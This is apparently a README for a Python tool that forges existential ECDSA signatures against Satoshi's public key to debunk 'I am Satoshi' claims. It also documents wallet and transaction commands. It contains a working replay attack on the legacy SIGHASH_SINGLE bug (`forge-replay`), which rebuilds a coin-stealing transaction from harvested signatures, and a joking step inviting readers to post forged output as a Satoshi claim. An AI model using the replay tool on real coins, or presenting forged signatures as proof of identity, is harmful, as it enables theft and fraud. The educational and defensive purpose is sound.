# Faketoshi


With everyone seemingly trying to prove they are Satoshi (looking at you [Craig Wright](https://en.bitcoin.it/wiki/Craig_Wright) and the recent["faketoshi twitter"](https://archive.fo/Br5Tl)), we've decided to make it easier for other people to make similar claims.

Credit to Greg Maxwell and Pieter Wuille whose various posts (
[here](https://www.reddit.com/r/btc/comments/9xpivk/satoshi_i_do_not_want_to_be_public_but_there_is/e9uo87m/), 
[here](https://twitter.com/pwuille/status/1063582706288586752), and 
[here](https://bitcoin.stackexchange.com/questions/81115/if-someone-wanted-to-pretend-to-be-satoshi-by-posting-a-fake-signature-to-defrau) 
) gave us enough of an understanding to implement our own Faketoshi-forger. We encourage you to check these resources out to understand why these continued Satoshi claims are nothing more than frauds.

The following implementation creates a signature (s) from a message hash (H(m)) that will validate against the public key from the genesis block. (Although it can easily be extended for **any Satoshi public key**). The trick is that the message (m), the pre-image of the message hash, itself cannot be known or derived. Thus this, and the other claims using the construction, is an existensial forgery.

You can browse to https://albacore.io/faketoshi for an generator in js that uses a similar construction.

### How to use
```
git clone https://github.com/Gurenduben/FakeToshi.git
cd FakeToshi

# No dependencies: Python 3.8+ and the standard library only.
python faketoshi.py          # same as `python -m faketoshi` (launcher script)
python -m faketoshi          # forge for the Genesis block pubkey
python -m faketoshi --json   # machine-readable output
python -m faketoshi --x <hex> --y <hex>   # any other Satoshi pubkey

# Inspect a claim: your transaction hash plus r and s
python -m faketoshi verify --txid <64-hex-txid> --r <hex> --s <hex>

# Your own key: r/s/z for a hash, and real signed transactions
python -m faketoshi keygen
python -m faketoshi address --wif <wif>
python -m faketoshi address --key <hex> --all   # every address this key controls
python -m faketoshi sign --key <hex> --txid <64-hex>
python -m faketoshi tx --key <hex> \
    --input <TXID>:<VOUT>:<AMOUNT_SATS> --output <ADDRESS>:<SATS>
python -m faketoshi unsigned --input ... --output ...   # then:
python -m faketoshi signraw --key <hex> --raw <txhex> --prevout <SCRIPT>:<AMOUNT>
python -m faketoshi decode <txhex>

# The SIGHASH_SINGLE signature-forgery bug
python -m faketoshi sighash-single-demo      # synthetic: replay a signature
python -m faketoshi replay-history           # the real BitPay/Copay theft
python -m faketoshi forge-replay --txid <txid> --value <sats> --to <addr>

# Optionally install the `faketoshi` command
pip install -e .
faketoshi

/* Optional */
Post output on twitter claiming to be Satoshi
```

Example output:

```
Sigs: (Signature 55413754737060266788854219512747294282411347075991670361274469493548857431872 93424288091486440220806836718410580011785069658824898026182133842707477669022)
Msg Hash: 38046050126674939701030028154132070444279826456685416136631938925359101037341
Public Key: (27508215986895653998444253056742679122811041256676723492045000752796524536365,14241215197100020720497056274756249375352291733590383593029593693896383225316)
```

### Why it works

ECDSA verification only checks that `R = (z/s)·G + (r/s)·Q` has `R.x ≡ r (mod n)`,
where `z` is the message hash. Pick any `a` and `b ≠ 0`:

```
R = a·G + b·Q        r = R.x mod n
s = r·b⁻¹ mod n      z = r·a·b⁻¹ mod n
```

`(r, s)` then verifies for the hash `z`, but the forger cannot invert `z` to a
message. Verification here is "hashless": `z` is used directly, with no hashing
step, exactly as in the original implementation.

### Checking a claim (tx hash → r, s, z)

Already have a transaction hash and someone's `r`/`s`? `verify` decodes them and
tells you whether they actually validate for the claimed key:

```
$ python -m faketoshi verify --txid <64-hex-txid> --r 0x<hex> --s 0x<hex>
r: 104292152526504073417039695267310701787131548716728747048188210357489653668428
s: 15304645249139486252745633290151691593355992781340320034292527119815455925986
z: 27492682039654594488495269414934967390315654912485842810069785923538281112352
txid: 3cc84e7d342c83a523972674cf40faecd3b68ad687bbaffb7bc4d680de112320
Claimed key: (PublicKey 27508215986895653998444253056742679122811041256676723492045000752796524536365 14241215197100020720497056274756249375352291733590383593029593693896383225316)
Valid for claimed key: yes
Recoverable key 0: (PublicKey 91115180070214885452469887462397640982075413200794526559784006358321412533085 95129171953199970708625660034647388438999789667275228803567994047138938480436)
Recoverable key 1: (PublicKey 27508215986895653998444253056742679122811041256676723492045000752796524536365 14241215197100020720497056274756249375352291733590383593029593693896383225316)
```

- `--txid` is interpreted as `z`: the 32-byte hash read big-endian, exactly how
  Bitcoin's verifier treats the double-SHA256 of a transaction (`0x` optional).
- `--r` / `--s` are hex by default (with or without `0x`); add `--dec` to read
  them as decimal. The radix is never guessed — every decimal number is also a
  valid hex one, so guessing would silently change the values.
- `--x` / `--y` are the claimed public key; they default to the Genesis key.
- `--json` emits the same information as structured data.
- Exit codes: `0` valid for the claimed key, `1` not valid, `2` bad input.

The `Recoverable key` lines are the public keys for which those exact `r`, `s`
and `z` *do* verify. Verification rewrites to `R = (z/s)·G + (r/s)·Q`, so
solving for the key gives `Q = r⁻¹·(s·R − z·G)` with `R` any point whose x
coordinate equals `r` — at most two candidates, and no way to tell which one
signed. **A signature on its own therefore proves nothing about who made it**;
only checking it against a known public key does. (This is the same reason
"hand me a signature and I'll tell you it's Satoshi" claims are hollow.)

Note that this checks a signature *you already have*. It cannot produce valid
`(r, s)` for a transaction hash of your choosing under someone else's public
key — that is the ECDSA problem itself.

### Defaults

| setting | default | why | change it with |
| --- | --- | --- | --- |
| network | **mainnet** | the addresses you see are the ones that hold real coins | `--network testnet`, `--network regtest` |
| address kind | **P2PKH** (legacy, compressed key) | universally payable — every wallet and service accepts it | `--kind p2wpkh` |
| key format | **compressed** (33-byte public key) | fixed; uncompressed WIFs are rejected | not configurable |

Mainnet is the default, so **broadcasting spends real coins**. Every command that
touches the chain says which network it is on before it signs or sends anything.

### Which address am I spending from?

This tool always signs with **compressed** keys, so the address you can spend
from is the P2PKH address of the compressed public key. One key has several
possible addresses, though, and they are not interchangeable — `address --all`
lists every one of them:

```
$ python -m faketoshi address --key <hex> --all
network:      mainnet
public key:   034f355bdcb7cc0af728ef3cceb9615d90684bb5b2ca5f859ab0f0b704075871aa (compressed)
signing with: p2pkh

* p2pkh                1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9
                        legacy, compressed key
  p2wpkh               bc1ql3e9pgs3mmwuwrh95fecme0s0qtn2880lsvsd5
                        native segwit (Bech32)
  p2pkh-uncompressed   1MsHWS1BnwMc3tLE8G35UXsS58fKipzB7a
                        legacy, UNCOMPRESSED key - not spendable by this tool
  p2sh-p2wpkh          3PFpzMLrKWsphFtc8BesF3MGPnimKMuF4x
                        wrapped segwit (P2SH-P2WPKH) - spendable via signraw

* = the address this tool spends from by default
```

`--json` gives the same thing machine-readably (`{"network", "public_key",
"compressed", "addresses": {kind: {"address", "note"}}}`).

`spend` asks for the address (and the public key) interactively, so you can
confirm what you are spending from as you go. To pin it non-interactively, pass
`--from` (and optionally `--pubkey`):

```
$ python -m faketoshi spend --key <hex>
...
Public key of the address to spend from (blank to skip): 034f355b...71aa
public key:  matches your private key
Address the coins are held at [1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9]: 1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9
spending from: 1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9 (p2pkh) - matches your key
...
```

If the address does not belong to your key, nothing is signed: it prints every
address the key *does* control and exits. The specific mistakes it catches:

- the **uncompressed** legacy address (`1MsHW…`) → refused, tells you to use the
  compressed address instead. Coins sent there are not spendable by this tool,
  because spending them needs an uncompressed-key signature.
- a **segwit** address with the wrong kind → tells you to add `--kind p2wpkh`.
- a **wrapped-segwit** address (`3…) → `spend` does not build P2SH transactions;
  it prints the exact `signraw --redeem-script <hex>` command to use instead.

To spend P2SH-P2WPKH coins with `signraw`, pass the redeemScript — the 22-byte
`0014` + `hash160(compressed pubkey)`:

```
$ python -m faketoshi signraw --key <hex> --raw <txhex> \
      --prevout a914…87:100000 \
      --redeem-script 0014fc7250a211deddc70ee5a2738de5f07817351cef
```

`signraw` checks that the redeemScript's hash actually matches one of your
`--prevout` scriptPubKeys, and refuses if it does not.

### Signing with your own key

Given your *own* private key, signing is ordinary ECDSA — no forgery involved,
and it works for any hash you like. Two distinct things are worth separating:

| | what it is | where it comes from |
| --- | --- | --- |
| `z` | the sighash: a hash of the transaction *and* the coin being spent | computed from the unsigned transaction |
| `r`, `s` | the ECDSA signature over that `z` | produced with your private key |
| `txid` | the id of the finished transaction | the double-SHA256 of the signed tx |

**`z` is not the txid.** A transaction's txid covers the whole transaction
including its signatures, so it cannot exist until after signing. The literal
"make `r`, `s`, `z` match a given txid" is therefore not a thing that exists —
and forcing a signature to verify under *someone else's* public key for a hash
*you* chose is the ECDSA problem itself, i.e. infeasible for any key you do not
control.

What does work, and is what this tool now does:

```
$ python -m faketoshi keygen
network:     mainnet
private_key: 41192f4f30bdb35a94c4f2c3b6d9e5ad9f70edc8f06a786e110da070aaa8495a
wif:         KyQFfSHnCHuscqmgZrd8uemydSLREUZQfihmw97zT4rozfGdCW5d
public_key:  03cd26fcd4836fbec4b6017ac3775b8719a0f239dc52d7e7dbd4ec7e8b005d21a3
address:     161a3GdHSCWeWbKJCPeAUPh39HUiQZy8y9

$ python -m faketoshi sign --key 41192f... --txid <64-hex hash>
r:            41394527160349269893567719044975991464542403203770718342843697060277985947166
s:            7079218598044748467707557541805724605987585697785694657053360430583559637789
z:            77648812782670860460512307594061302913369283834606025297048026922953510464427
public key:   034f355bdcb7cc0af728ef3cceb9615d90684bb5b2ca5f859ab0f0b704075871aa
verified:     yes (against the public key above)
```

Build a real, broadcastable transaction and see the `r`/`s`/`z` of every input
signature:

```
$ python -m faketoshi tx --key <hex> \
      --input <TXID>:0:100000 --output 1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9:90000
network:   mainnet
address:   1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9
...
txid:   2ad83856c35e86d6e2f9ee2d2e7f9218b32a337a7b216c579a411327c3fdfc58
wtxid:  2fa3a5dd7ba68e8dcdb73e52a2b00a722e6bedea45bcbe8bbbdca81d6f8e7130
input 0: aaaaaaaa...:0 sequence=0xffffffff
output 0: 90000 sats -> 1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9
fee:      10000 sats

input 0 (p2wpkh)
  r: 7069007047506188436161873630490348643309926360255327021123589326885453870944
  s: 2452233303911921295559025361392836845077180123795995340953098431890553879292
  z: 24151005605303636859332393517207570533580414753563346217044012279647103940690
  sighash type: 0x01
  signature: 304402200fa0ea...

raw transaction: 02000000000101aaaaaaaa...
```

Details that matter:

- **The prevout amount is mandatory** in `--input`. Segwit signatures commit to
  the value of the coin being spent (BIP143), so signing with a wrong amount
  produces a transaction nodes reject.
- Signing is **RFC 6979 deterministic**: the same key and transaction always
  give the same signature, so you can re-run and compare. `s` is low-s
  normalised, as consensus/policy requires.
- Supported spend types: **P2PKH** (default), **P2WPKH**, and P2SH-P2WPKH via
  `signraw --redeem-script <hex>` (or the library's `sign_transaction_kinds`).
  Taproot (Schnorr) is *not* supported.
- `--sighash` accepts `1` (ALL), `2` (NONE), `3` (SINGLE), `+0x80` for
  ANYONECANPAY; the legacy and BIP143 rules are both implemented, including the
  known `SIGHASH_SINGLE` bug.
- `unsigned` + `signraw` let you build the transaction with one tool and sign it
  elsewhere; `decode` prints a transaction and extracts the `r`/`s` from each
  witness.
- **Defaults are mainnet and P2PKH** (see [Defaults](#defaults)). That means
  real coins if you broadcast. Never paste a mainnet key into a tool you have
  not audited, and remember these are hot keys. Add `--network testnet` (or
  `regtest`) to practise on worthless coins.

### The real signature-forgery condition: the SIGHASH_SINGLE bug

The other half of the story is a *genuine* signature-forgery bug, not an
existential one. With `SIGHASH_SINGLE` a signature commits to input `i` and
output `i`. When the transaction has **no output at index `i`**, Bitcoin Core's
`SignatureHash` returns the constant `uint256::ONE` — the bytes `01 00 … 00`,
i.e. `2**248` — instead of a hash of the transaction.

A signature over that constant is valid for **every** transaction that keeps the
input at an index without a matching output, so it commits to no amount,
destination or other input. Anyone who obtains such a signature can spend the
coin anywhere. This is the flaw behind the BitPay/Copay multisig losses.

```
$ python -m faketoshi sighash-single-demo
SIGHASH_SINGLE bug demonstration
================================
wallet (2-of-3 P2SH multisig)
  redeemScript: 5221020463...
  address:      355ruwEdjxaxYsecyiBgBBNRBEqQn3knut

step 1 - a transaction where input 1 has no matching output
  inputs: 2, outputs: 1
  digest for input 0 (SIGHASH_ALL):    8106667232...dc2087
  digest for input 1 (SIGHASH_SINGLE): uint256::ONE (01 00 ... 00)
  -> the bug: the digest is the constant uint256::ONE, not a hash

step 2 - a *different* transaction, built by someone else
  destination: 16Y48h9KAzppPPER9weEcuzHFEagjkPZh7
  scriptSig: 00483045022100e3595770...

step 3 - verification
  signature 0 valid in the attacker tx: True
  signature 1 valid in the attacker tx: True
  same signature with SIGHASH_ALL valid in the attacker tx: False
```

The same signature, lifted out of the first transaction, validates in a second
one that pays a different address — and the `SIGHASH_ALL` comparison shows the
signature failing to carry over, which is exactly the protection the bug
removes. The demonstration is entirely offline on synthetic outpoints.

Details that matter:

- **`uint256::ONE` is `2**248`, not the integer `1`** in ECDSA terms, because it
  is the 32 bytes `01 00…00` read big-endian. Implementations that use `1` here
  describe the bug loosely but compute the wrong digest.
- **Segwit v0 (BIP143) does not have this bug**: a missing matching output just
  means a zero `hashOutputs`, so the signature still commits to the transaction.
- Fixes are simple: never sign `SIGHASH_SINGLE`, require
  `len(outputs) >= len(inputs)`, and prefer `SIGHASH_ALL`/segwit.
- `analyse_sighash_single(tx, prevouts)` scans a raw transaction for
  `SIGHASH_SINGLE` signatures and reports whether the bug condition triggers.

`scriptsig`, `redeemscript`, `pubkey`, `decodesig` and `serialize` mirror the
inspection helpers of the reference tooling this was modelled on. For example,
the article's 2-of-3 script decodes to its published address:

```
$ python -m faketoshi redeemscript 5221023927b5cd...53ae
2-of-3 multisig redeemScript
  key 0: 023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f0561196
  ...
  hash160: 06612b7cb2027e80ec340f9e02ffe4a9a59ba762
  P2SH spk: a91406612b7cb2027e80ec340f9e02ffe4a9a59ba76287
$ python -m faketoshi decode <that spk as an output>
output 0: 300000 sats -> 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe
```

### Replaying the real theft: `replay-history`

The historical event the bug is famous for is on the chain, and this tool ships
the transaction itself so you can audit it offline:

```
$ python -m faketoshi replay-history
The BitPay/Copay SIGHASH_SINGLE theft

transaction 791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf
  inputs: 3   outputs: 1
  5967200 sats (0.05967200 BTC) left 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe for 1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3

why the signatures transferred:
  legacy SIGHASH_ALL digest would have been 4592914080893051878949606799692956561...
  legacy SIGHASH_SINGLE digest is the constant 4523128485832663883733241601901871400...
                                             (uint256::ONE)

signatures harvested (4):
  input 1: signature 0x03, 72 bytes
    digest is the uint256::ONE constant: True
    verifies under multisig key index: [0]
  input 1: signature 0x03, 71 bytes
    ...verifies under multisig key index: [1]
  ...
```

Those signatures had been produced for a transaction that was never broadcast.
Because they commit to the constant `2**248` instead of a digest, they were
valid for **any** transaction spending that coin — so whoever held them could
sweep the 2-of-3 address, and did. No private key was needed.

`forge-replay` rebuilds such a theft from harvested signatures:

```
$ python -m faketoshi forge-replay --txid <txid> --value 677200 \
      --to 1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9
harvested 4 signature(s) from 791fe035...d0cf

digest in the new transaction: 452312848583266388373324160190187140051835877600158453279131187530910662656
reassembled scriptSig: 00483045022100dfcfafcea73d83e1...53ae
valid: yes - the coin can be spent by anyone holding this signature
txid: 1a052ec7322d7b8feb6c5de3fa2191ede94852920e55df7a4b7b38474bcc900c

This transaction spends the coin without any key holder having signed
it. It is printed, not broadcast.
```

The target input must sit at an index with **no matching output** — that is the
entire precondition. `--from-tx` harvests from a transaction you supply instead
of the built-in one; signatures that were signed `SIGHASH_ALL` produce nothing,
because they commit to a real digest.

Verification of the built-in transaction, for what it is worth: its txid hashes
to the value above, its single output pays `1Lyafe8m…`, the redeem script's
`hash160` is the victim address, and both signatures verify over `2**248` under
the third-party `ecdsa` library. `python-bitcointx` refuses to compute the
digest at all (`outIdx 1 out of range`), which is the modern guard rail.

⚠️ A note on the reference material: the article it is modelled on
(`demining/Digital-Signature-Forgery-Attack`) mixes the genuine SIGHASH_SINGLE
bug with claims about CVE-2025-29774/29775, which are **XML signature
verification bypasses in the Node.js `xml-crypto` library** — unrelated to
Bitcoin. Its notebook only shells out to a prebuilt binary downloaded from a
third-party site. Nothing here executes that binary or relies on it; all the
cryptography is this repository's own, checked against the vectors above.

### Guided send: `spend`

The quickest path from "I have coins in a transaction" to a signed, spendable
transaction. It asks which coins you are spending — the **public key**, the
**address** holding them and the **transaction id** — then where to send them,
and works out the rest:

```
$ python -m faketoshi spend --key <hex>
key format:  compressed (33-byte public key)
your address: 1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9

Tell me which coins to spend. Press Enter to accept the default shown in [brackets].
Public key of the address to spend from (blank to skip): 034f355bdcb7cc0a...71aa
public key:  matches your private key
Address the coins are held at [1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9]:
spending from: 1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9 (p2pkh) - matches your key
You are spending from 1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9 (your address for this key)
Transaction id holding the coins (txid): bbbbbb...bbbb

Outputs of bbbbbb...bbbb:
  vout 0: 150000 sats -> 1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9
  vout 1: 5000 sats -> 1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9  (spent by cccc...)
Using vout 0
Spending 150000 sats (vout 0)
Address to send to: 1LhsLSUhjKiBWC3NTLZ7LeXPAdXXnDDg9c
Amount to send in satoshis (max 149000) [149000]: 120000

network:   mainnet
txid:   671defe7b48b6e4338eeb01ee3e5998c4f55a0a5623ac01fb603b5876e790771
output 0: 120000 sats -> 1LhsLSUhjKiBWC3NTLZ7LeXPAdXXnDDg9c
output 1: 29000 sats -> 1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9
fee:       1000 sats

input 0 (p2pkh)
  r: 13833665704091852410380424202317488631917989966809020605154961286015434317443
  s: 12412599491612096321021231994955708688771632628716482483936922106243143072732
  z: 26694242829220974310791855546522354592590164048673495937700179924798489494256
  sighash type: 0x01
  signature: 304402201e9593cb...

raw transaction: 02000000000101bbbb...
Broadcast this transaction now? (y/N) [n]:
```

Why it asks for the txid rather than a raw amount: segwit signatures commit to
the value of the coin being spent (BIP143), so the amount must come from the
chain. `spend` looks the transaction up via BlockCypher, lists its **unspent**
outputs (skipping ones with a `spent_by`), and uses the real value.

- The first three questions are all optional: press Enter to skip the public
  key (it is only a cross-check) or to accept the suggested address. Each answer
  can also be given up front with `--pubkey`, `--from` and `--txid`.
- A **wrong** public key stops immediately, before any chain lookup or signing,
  and shows the key that actually belongs to your private key. Malformed input
  re-prompts instead of aborting.
- If you paste a **segwit** address, the script type switches to `p2wpkh`
  automatically. Pass `--kind` explicitly and your choice is respected instead.
- `--yes` takes the defaults for the guided questions, for when you already
  know exactly what you are spending.
- Change goes back to your own address unless you pass `--change`.
- Outputs and amounts are validated: over-spending is refused with a clear
  message, and the destination address is checksum-verified (a typo is caught
  before you sign anything).
- Nothing is broadcast without an explicit `y`; decline and the signed hex is
  printed for you to send yourself.
- Fully scriptable too:

```
python -m faketoshi spend --json --key <hex> \
    --txid <txid> --address <addr> --amount 120000 [--broadcast]
```

Pass `--from <address>` to assert which address the coins sit on (see
[Which address am I spending from?](#which-address-am-i-spending-from)); it is
checked before anything is signed.

`--json` prints only JSON (no prompts), requires `--txid`/`--address`/`--amount`,
and infers `--vout` when the transaction has exactly one unspent output.
`--offline` skips the chain lookup when you already know the input amount.
`--fee` sets the fee in satoshis (default 1000).

### Live UTXOs and broadcasting (BlockCypher)

`unspent` lists real unspent outputs, ready to paste into `--input`:

```
$ export BLOCKCYPHER_TOKEN=...                     # only if you have one
$ python -m faketoshi unspent 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe --input-specs
# add --network testnet for testnet addresses
7e3c...e21:0:677200
9a10...ff4:1:5000000
```

and `broadcast` pushes a signed transaction:

```
$ python -m faketoshi tx --key <hex> \
      --input <utxo-spec> --output <address>:<sats> --json | jq -r .hex > tx.hex
$ python -m faketoshi broadcast - < tx.hex
network:  mainnet
txid:     2ad83856c35e86d6e2f9ee2d2e7f9218b32a337a7b216c579a411327c3fdfc58
size:     191 bytes
output 0: 90000 sats
broadcast this transaction? [y/N]
```

Safety behaviour, by design:

- **The token is read from `$BLOCKCYPHER_TOKEN`** (or `--token`). It is never
  written to disk, and it is stripped from error messages — `unspent` works
  unauthenticated at BlockCypher's lower rate limit if you have no token.
- `unspent` skips outputs that are already spent and rows that are inputs
  rather than outputs, sorts largest-first (fewer inputs, lower fees), and can
  filter with `--confirmed-only` / `--min-confirmations`.
- `broadcast` **decodes and checks the transaction locally first**, prints the
  txid and outputs, and asks for confirmation (`--yes` to skip, `--json` for
  scripted use). It refuses to proceed non-interactively without `--yes`.
- After pushing, it compares the node's reported txid with the locally computed
  one and warns on a mismatch — a cheap sanity check that the hex you sent is
  the transaction you built.
- `--network` maps to BlockCypher chains: `mainnet` → `btc/main`,
  `testnet` → `btc/test3`. **Broadcasting on mainnet spends real coins and
  cannot be undone.**

### As a library

```python
from faketoshi import generate_forgery, valid_forgery
from faketoshi.__main__ import GENESIS_X, GENESIS_Y

forgery = generate_forgery(GENESIS_X, GENESIS_Y)
assert valid_forgery(forgery)
print(forgery.sig.r, forgery.sig.s, forgery.msg)
```

```python
from faketoshi import inspect_claim, recover_public_keys, tx_hash_to_z, format_tx_hash

result = inspect_claim(txid, r_hex, s_hex, GENESIS_X, GENESIS_Y)   # radix = hex
result.valid            # does it verify for that key?
result.z, result.r      # decoded values
str(result)             # the human-readable report shown above

recover_public_keys(r, s, tx_hash_to_z(txid))   # the keys it does verify for
format_tx_hash(z)                                # hex form of a z value
```

```python
from faketoshi import (
    build_transaction, key_info, make_unsigned, sign_raw_transaction,
    sign_z, verify_z, private_key_to_public_key, address_to_script,
)

private_key = int('11' * 32, 16)
address, wif, pubkey = key_info(private_key, 'testnet')

# Sign any 32-byte hash with your own key
r, s = sign_z(private_key, int('ab' * 32, 16))

# Build, sign and inspect a transaction
built = build_transaction(
    inputs=['aa' * 32 + ':0:100000'],
    outputs=[address + ':90000'],
    private_key=private_key,
    network='testnet',
)
built.txid, built.hex, built.fee()
for info in built.signatures:
    print(info.r, info.s, info.z)
```

### Tests

```
python -m unittest discover -s tests -t . -v
```

### Implementation notes

This repository was originally written in Haskell against the `cryptonite`
package; it is now plain Python with no third-party dependencies. The secp256k1
arithmetic lives in `faketoshi/curve.py`, the forging and verification logic in
`faketoshi/faketoshi.py`, and the CLI in `faketoshi/__main__.py`. Key recovery
lives in `recover_public_keys`, and point decompression (needed to recover keys
from `r`) in `curve.point_from_x`.

Signing and transactions are separate from the forgery code:

| module | contents |
| --- | --- |
| `faketoshi/signing.py` | RFC 6979 nonces, `sign_z`/`verify_z`, DER, legacy and BIP143 sighashes, tx parsing/serialisation, `txid`/`wtxid` |
| `faketoshi/sighash_single.py` | multisig scripts, the bug demo, `harvest_signatures`, `forge_from_harvest`, `replay_history` |
| `faketoshi/wallet.py` | address ↔ script, WIF, `build_transaction`, `sign_raw_transaction`, `make_unsigned` |
| `faketoshi/encoding.py` | hashes (incl. pure-Python RIPEMD160 fallback), varints, base58check, bech32 |
| `faketoshi/blockcypher.py` | BlockCypher client: `unspent_outputs`, `balance`, `push`, `decode`; injectable transport for tests |
| `faketoshi/sighash_single.py` | multisig scripts, scriptSig parsing, the SIGHASH_SINGLE demo, `analyse_sighash_single`, `replay_signature` |

Signatures and sighashes were cross-checked against the third-party
`python-bitcointx` library: identical digests and txids, and the emitted DER
signatures verify independently. The SIGHASH_SINGLE behaviour follows Bitcoin
Core's `SignatureHash` (`src/script/interpreter.cpp`) and `uint256::ONE`
(`src/uint256.cpp`). The curve is
fixed to secp256k1 (the only curve the original used), and a public key point
that is not on the curve raises `ValueError` instead of producing garbage.